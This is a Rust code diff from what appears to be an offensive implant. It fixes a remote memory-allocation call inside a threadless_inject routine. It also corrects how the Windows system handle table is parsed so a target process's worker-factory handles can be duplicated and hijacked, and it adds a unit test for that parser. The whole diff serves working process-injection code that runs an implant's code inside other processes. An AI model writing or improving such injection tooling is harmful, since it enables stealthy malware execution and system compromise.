@@ -540,6 +540,7 @@ pub unsafe fn threadless_inject(
         crate::syscalls::nt_allocate_virtual_memory(
             rt,
             target_h as usize,
+            0, // ZeroBits
             &mut remote_base,
             &mut alloc_size,
             0x3000, // MEM_COMMIT | MEM_RESERVE
@@ -734,63 +735,14 @@ unsafe fn hijack_worker_factory(
     }
 
     // ---- 3. Walk SYSTEM_HANDLE_INFORMATION_EX ----
-    //   ULONG_PTR NumberOfBytesNeeded;     (8 bytes, ignored — use Count)
-    //   ULONG NumberOfHandles;             (4 bytes)
-    //   ULONG Reserved;                    (4 bytes, padding on x64)
-    //   SYSTEM_HANDLE_INFORMATION_EX Handles[];  (Count entries)
-    //
-    // Each SYSTEM_HANDLE_INFORMATION_EX entry (x64):
-    //   ULONG Object;            // offset 0x00 — object body pointer (unused)
-    //   ULONG UniqueProcessId;   // offset 0x04 — *truncated* PID
-    //   ...
-    //   HANDLE HandleValue;      // offset 0x08 — the handle (full 8 bytes)
-    //   PVOID Object;            // offset 0x10 — object body (full pointer)
-    //   ULONG GrantedAccess;     // offset 0x18
-    //   ...
-    //   ULONG UniqueProcessId;   // offset 0x20 — full PID
-    //   ...
-    //   (total entry size = 0x20 on x64; structure padded to 0x20)
-    //
-    // We read Count from offset 0x08 ( NumberOfHandles ), stride 0x20, and for
-    // each entry compare the PID at offset 0x20 to `target_pid`. The HandleValue
-    // at offset 0x08 is the candidate to duplicate.
-    const COUNT_OFF: usize = 0x08;
-    const HANDLES_OFF: usize = 0x10; // first entry starts after the 0x10-byte header
-    const ENTRY_STRIDE: usize = 0x20;
-    const ENTRY_HANDLE_OFF: usize = 0x08;
-    const ENTRY_PID_OFF: usize = 0x20;
+    // Kernel payload: u64 NumberOfHandles at offset 0x00, then a dense array of
+    // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entries (stride 0x28 on x64). The pure
+    // parse lives in `collect_target_handles` (unit-tested with a synthetic
+    // buffer); here each candidate handle is duplicated + probed in turn.
+    let mut candidates = crate::heap::Vec::new();
+    collect_target_handles(&buf, target_pid, &mut candidates);
 
-    if buf.len() < COUNT_OFF + core::mem::size_of::<u32>() {
-        return Err(String::from("hijack: handle table truncated"));
-    }
-    let count = unsafe {
-        (buf.as_ptr().add(COUNT_OFF) as *const u32).read_unaligned()
-    };
-    let max_entries = (buf.len().saturating_sub(HANDLES_OFF)) / ENTRY_STRIDE;
-    let count = if (count as usize) > max_entries {
-        max_entries
-    } else {
-        count as usize
-    };
-
-    for i in 0..count {
-        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
-        if entry + ENTRY_STRIDE > buf.len() {
-            break;
-        }
-        let pid = unsafe {
-            (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u32).read_unaligned()
-        };
-        if pid != target_pid {
-            continue;
-        }
-        let handle_val = unsafe {
-            (buf.as_ptr().add(entry + ENTRY_HANDLE_OFF) as *const usize).read_unaligned()
-        };
-        if handle_val == 0 || handle_val == (-1isize) as usize {
-            continue;
-        }
-
+    for handle_val in candidates {
         // Duplicate this handle into the implant with DUPLICATE_SAME_ACCESS.
         let mut dup: *mut c_void = core::ptr::null_mut();
         let ok = unsafe {
@@ -835,6 +787,64 @@ unsafe fn hijack_worker_factory(
     Err(String::from(
         "hijack: target has no worker-factory handle (no TP worker?)",
     ))
+}
+
+/// Walk a `SYSTEM_HANDLE_INFORMATION_EX` buffer (the payload returned by
+/// `NtQuerySystemInformation(SystemExtendedHandleInformation)`) and collect
+/// every `HandleValue` owned by `target_pid` into `out`, skipping null and
+/// pseudo (`(HANDLE)-1`) handles. Pure parse — nothing is duplicated or probed
+/// here — so it is unit-testable against a synthetic buffer.
+///
+/// Kernel layout (x64):
+/// ```text
+///   +0x00 ULONG_PTR NumberOfHandles           (u64)
+///   +0x08 SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[NumberOfHandles]
+/// ```
+/// Each entry (stride `0x28`):
+/// ```text
+///   +0x00 PVOID     Object
+///   +0x08 ULONG_PTR UniqueProcessId
+///   +0x10 ULONG_PTR HandleValue
+///   +0x18 ULONG     GrantedAccess
+///   +0x1C USHORT    CreatorBackTraceIndex
+///   +0x1E USHORT    ObjectTypeIndex
+///   +0x20 ULONG     HandleAttributes
+///   +0x24 ULONG     Reserved
+/// ```
+/// A truncated buffer is a no-op (never panics).
+fn collect_target_handles(buf: &[u8], target_pid: u32, out: &mut crate::heap::Vec<usize>) {
+    const COUNT_OFF: usize = 0x00;
+    const HANDLES_OFF: usize = 0x08; // first entry starts after the u64 count
+    const ENTRY_STRIDE: usize = 0x28;
+    const ENTRY_HANDLE_OFF: usize = 0x10;
+    const ENTRY_PID_OFF: usize = 0x08;
+
+    if buf.len() < COUNT_OFF + core::mem::size_of::<u64>() {
+        return;
+    }
+    let count = unsafe { (buf.as_ptr().add(COUNT_OFF) as *const u64).read_unaligned() };
+    let max_entries = (buf.len().saturating_sub(HANDLES_OFF)) / ENTRY_STRIDE;
+    let count = count.min(max_entries as u64) as usize;
+
+    for i in 0..count {
+        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
+        if entry + ENTRY_STRIDE > buf.len() {
+            break;
+        }
+        let pid = unsafe {
+            (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u64).read_unaligned()
+        };
+        if pid != target_pid as u64 {
+            continue;
+        }
+        let handle_val = unsafe {
+            (buf.as_ptr().add(entry + ENTRY_HANDLE_OFF) as *const usize).read_unaligned()
+        };
+        if handle_val == 0 || handle_val == (-1isize) as usize {
+            continue;
+        }
+        out.push(handle_val);
+    }
 }
 
 /// Close a kernel handle best-effort. Resolves `kernel32!CloseHandle` lazily
@@ -895,5 +905,43 @@ mod tests {
     fn tp_struct_sizes_match_layout() {
         assert_eq!(core::mem::size_of::<TpDirect>(), TP_DIRECT_SIZE);
         assert_eq!(core::mem::size_of::<TpWork>(), TP_WORK_SIZE);
+    }
+
+    /// The SYSTEM_HANDLE_INFORMATION_EX parse must read the u64 count at 0x00,
+    /// stride 0x28 entries, UniqueProcessId at +0x08 and HandleValue at +0x10
+    /// (x64 layout). Wrong-offset parsing would return the truncated u32 count
+    /// or garbage handles, so this pins the exact kernel layout.
+    #[test]
+    fn handle_table_parse_matches_x64_layout() {
+        const HANDLES_OFF: usize = 0x08;
+        const ENTRY_STRIDE: usize = 0x28;
+        let mut buf = [0u8; HANDLES_OFF + 3 * ENTRY_STRIDE];
+        buf[0..8].copy_from_slice(&3u64.to_le_bytes()); // NumberOfHandles = 3
+
+        // Entry 0: foreign PID (0x100) with handle 0xABC — must be skipped.
+        buf[HANDLES_OFF + 0x08..HANDLES_OFF + 0x10].copy_from_slice(&0x100u64.to_le_bytes());
+        buf[HANDLES_OFF + 0x10..HANDLES_OFF + 0x18].copy_from_slice(&0xABCu64.to_le_bytes());
+
+        // Entry 1: target PID (0xDEADBEEF) with handle 0x1234 — the hit.
+        let e1 = HANDLES_OFF + 1 * ENTRY_STRIDE;
+        buf[e1 + 0x08..e1 + 0x10].copy_from_slice(&0xDEADBEEFu64.to_le_bytes());
+        buf[e1 + 0x10..e1 + 0x18].copy_from_slice(&0x1234u64.to_le_bytes());
+
+        // Entry 2: target PID but null handle — must be skipped.
+        let e2 = HANDLES_OFF + 2 * ENTRY_STRIDE;
+        buf[e2 + 0x08..e2 + 0x10].copy_from_slice(&0xDEADBEEFu64.to_le_bytes());
+        // HandleValue stays 0.
+
+        let mut out = crate::heap::Vec::new();
+        collect_target_handles(&buf, 0xDEADBEEF, &mut out);
+        assert_eq!(out.as_slice(), &[0x1234usize]);
+
+        // A truncated buffer (no room for the u64 count, or a partial entry)
+        // must be a no-op, never a panic.
+        let mut tiny = crate::heap::Vec::new();
+        collect_target_handles(&buf[..4], 0xDEADBEEF, &mut tiny);
+        assert!(tiny.is_empty());
+        collect_target_handles(&buf[..HANDLES_OFF + ENTRY_STRIDE / 2], 0xDEADBEEF, &mut tiny);
+        assert!(tiny.is_empty());
     }
 }
